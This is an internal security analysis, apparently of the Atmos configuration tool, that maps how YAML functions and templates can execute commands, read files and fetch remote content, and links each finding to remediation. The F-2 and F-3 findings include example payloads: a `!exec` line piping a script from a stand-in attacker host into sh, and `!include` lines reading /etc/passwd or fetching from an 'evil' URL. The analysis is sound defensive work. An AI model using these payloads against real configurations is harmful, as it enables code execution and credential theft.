# Function Execution Security Analysis

## Overview

This is a security analysis of how Atmos executes code, reads files, and fetches remote content on
behalf of configuration. It maps every path through which **YAML functions** (`!exec`, `!include`,
`!store`, `!secret`, `!terraform.output`, …) and **Go/Gomplate/Sprig templates** can run commands,
read files, or reach the network, and assesses the real-world risk of each.

This is background analysis, not a product spec. The remediation is designed in the
[Policies PRD](./prd/policies.md); each finding below maps to a control
there.

Two structural gaps frame the analysis:

1. **No policy controls over function usage.** There is no mechanism to allow, deny, or gate which
    YAML functions or template functions may run — only a per-invocation `--skip` and coarse
    engine-level on/off toggles.
2. **No trust boundary between local and remote config.** A remotely-imported stack (or a remote
    `atmos.yaml`) is processed with the same trust as a file the user authored. If it carries `!exec`
    or an executing template, the command runs locally with the user's environment and credentials.

### Severity legend

- **Real risk** — exploitable in a realistic supply-chain or shared-config scenario, leading to code
  execution, credential exposure, or data disclosure.
- **"LARP" / low real risk** — theoretical, or requires the attacker to already have a capability that
  moots the finding (e.g. they can already write local files the victim will run). Called out honestly
  so remediation effort is spent where it matters.

## Threat Model

The primary attacker is **untrusted configuration content** reaching a trusted execution context:

- A user vendors or imports a component/stack from a third-party repo.
- A user runs `atmos` in a repo they cloned but did not fully review.
- A shared `atmos.yaml` (or a fragment it imports) is modified upstream.
- A pull request adds a remote import or a templated value to a stack.

The victim runs a normal command (`atmos terraform plan`, `atmos describe stacks`, even config load),
and attacker-controlled content executes with the victim's identity, cloud credentials, and shell.

Out of scope: an attacker who can already write arbitrary files to the victim's local working tree and
have the victim run them — at that point the attacker already has code execution, so config-level
execution adds nothing.

## Findings

### F-1 — `!exec` runs from `atmos.yaml` itself — **High (real risk)**

`!exec` is not limited to stack manifests; it is evaluated while **loading `atmos.yaml`** (and any
config it imports).

- **Trace:** `pkg/config/process_yaml.go:453` (`processScalarNodeValue` → `processExecTag`) →
  `pkg/utils/yaml_func_exec.go` (`ProcessTagExec`) → `pkg/utils/shell_utils.go:47`
  (`ExecuteShellAndReturnOutput`). Execution uses the `mvdan.cc/sh/v3` in-process interpreter, which
  still resolves and runs external binaries on `PATH` — full arbitrary command execution, with the
  parent process's `os.Environ()`.
- **Why it's the worst one:** this is the **earliest** execution point and is **not** gated by
  `--skip` or `--process-functions` (both of which only affect the stack processing path). Merely
  loading a malicious `atmos.yaml`, or one that imports a remote config, runs commands.
- **Controls today:** only `ATMOS_SHLVL`/`MaxShellDepth = 10` recursion capping — prevents infinite
  nested shells, not malicious commands.

### F-2 — Remote imports are trusted like local, with no integrity checks — **High (real risk)**

Both stack imports and `atmos.yaml` imports can pull remote content, recursively, with **no
allowlist, no checksum, and no signature verification**.

- **Trace:** stacks — `internal/exec/stack_processor_utils.go:1434-1520` (import loop → template render
  → tag-preserving parse); `atmos.yaml` — `pkg/config/adapters/gogetter_adapter.go` (advertises
  `http(s)`, `git::`, `s3::`, `gcs::`, `oci://`, `file://`, `scp`, `sftp`, `github.com/`,
  `bitbucket.org/`; recurses into the remote file's own `import:` entries). Downloader —
  `pkg/downloader/gogetter_downloader.go` (`DisableSymlinks: false`).
- **Attack path:** victim adds `import: - github.com/attacker/stacks//prod.yaml`; that file contains
  `vars: { x: !exec "curl attacker.sh | sh" }` or an executing template. On the next
  `atmos terraform plan`/`describe`, the lazy YAML-function pass runs the command.
- **Provenance:** remote content flows through the **identical** template/parse pipeline as local
  content; there is no local-vs-remote distinction at any point.

### F-3 — `!include` has no path confinement — **Medium (real risk)**

`!include` / `!include.raw` resolve absolute paths as-is and relative paths without confinement, and
also fetch arbitrary remote URLs.

- **Trace:** `pkg/utils/yaml_include_by_extension.go` — `findLocalFile` (`filepath.IsAbs` →
  `resolveAbsolutePath`, then relative to manifest, then `base_path`, with no traversal guard);
  `processRemoteFile` (go-getter for `git`, `github`, `s3`, `gcs`, `http(s)`, `oci`, `scp`, `sftp`).
- **Impact:** `!include /etc/passwd` or `!include ../../secret` reads arbitrary local files into
  config; `!include https://evil/x.yaml` fetches remote content at eval time. Combined with output
  (e.g. `describe` JSON), this enables local file disclosure and SSRF-style fetches.

### F-4 — Templates expose non-hermetic Sprig, full Gomplate, and transitive exec — **Medium/High (real risk)**

The template engine merges the full non-hermetic function sets and a function that evaluates arbitrary
YAML functions.

- **Trace:** `internal/exec/template_utils.go:47` uses `sprig.FuncMap()` (alias of `TxtFuncMap()`,
  **not** `HermeticTxtFuncMap()`), exposing `env`, `expandenv`, `getHostByName` (env exfiltration,
  DNS-based SSRF). Line 70 (`ProcessTmpl`) merges `gomplate.CreateFuncs(...)` + Sprig + Atmos funcs
  **unconditionally** (no `enabled` gate on this path). Gomplate datasources
  (`templates.settings.gomplate.datasources`) have **no scheme restriction** (`file`, `http`, `s3`,
  `env`, …). `internal/exec/template_funcs.go` exposes `atmos.Resolve`, which evaluates an arbitrary
  YAML-function string including `!exec` — a template → exec bypass.
- **Controls today:** coarse booleans only — `settings.templates.settings.enabled|sprig.enabled|
  gomplate.enabled` and a gomplate `timeout` (default 5s). No per-function allow/deny; enabling an
  engine enables all of its dangerous functions.

### F-5 — No capability-gating policy layer; existing OPA runs too late — **High (gap)**

Atmos has OPA/Rego and JSON-Schema validation, but it operates on the **fully-resolved, post-render**
component config — after every function, template, datasource fetch, and import has already executed.

- **Trace:** `internal/exec/validate_utils.go` (`ValidateWithOpa`, fixed query `data.atmos.errors`);
  `internal/exec/validate_component.go` (`ValidateComponent` receives the resolved `componentSection`).
- **Impact:** policy sees only *results*, never the function names used, the datasource URLs, the
  import list, or the template source. It cannot deny a function or import **before** it runs. There is
  no hook into the render/parse pipeline and no capability allow/deny surface anywhere in the codebase
  (no `sandbox`, `allowlist`, `denylist`, `allow_exec`, `disable_exec` config exists).

### F-6 — Partial, bypassable URI validation — **Medium**

The one URI validator is inconsistent and not a universal gate.

- **Trace:** `pkg/utils/go_getter_utils.go` — `ValidateURI` blocks empty/`..`/spaces/oversized and
  validates the scheme **only when `://` is present** via `IsValidScheme` (allows `http`, `https`,
  `git`, `ssh`, `git::https`, `git::ssh`). Bypasses: `file://`, `s3::`, `gcs::`, `oci://`, `scp://`,
  `sftp://`, and scheme-less `github.com/...` shorthand. `ValidateURI` is called in the vendor path but
  is not applied uniformly to all downloads. `DisableSymlinks: false` disables go-getter's symlink
  protections.

## Existing Controls (and why they're insufficient)

| Control | Scope | Gap |
|---|---|---|
| `--skip=<fn>` | stack processing path only, per-invocation | does not protect the `atmos.yaml` load path; not a persistent policy |
| `--process-functions=false` | describe-family commands only, all-or-nothing | not available for `plan`/`apply`; no granularity |
| `settings.templates.settings.enabled|sprig.enabled|gomplate.enabled` | template engine | coarse on/off; enabling an engine enables its dangerous funcs; doesn't affect `!exec`/`!include` |
| `gomplate.timeout` | datasource/exec calls | bounds duration, not capability |
| `pkg/ci/forktrust.go` | CI fork-PR gate | governs *who triggers CI*, not the integrity/trust of imported/vendored content |

## CVE Posture

Atmos already tracks upstream CVEs in this area — e.g. the workaround for go-getter
**CVE-2025-8959** (the `///` root-clone regression) in `internal/exec/vendor_utils.go`
(`normalizeVendorURI`). This analysis surfaces **Atmos-specific** attack vectors (F-1…F-6) that are not
upstream CVEs but are exploitable design gaps in how Atmos *uses* these capabilities.

## Mapping to Remediation

Each finding maps to a control in the
[Policies PRD](./prd/policies.md):

- **F-1, F-4** → gate `exec` (including `atmos.Resolve` → `!exec`) with provenance awareness.
- **F-2, F-6** → trusted-source allowlist + scheme restrictions at the go-getter chokepoint; consider
  flipping `DisableSymlinks` under strict mode.
- **F-3** → `!include` path confinement (`confine_to`, `deny_absolute`, `deny_parent_traversal`).
- **F-4** → per-function allow/deny for the non-hermetic template funcs.
- **F-5** → a **pre-execution** capability gate (admission phase) unified with the existing
  post-render validation into one policy subsystem.

The remediation rolls out in phases — warn now, opt-in strict later, secure-by-default in a future
major — so none of these break existing users on upgrade.
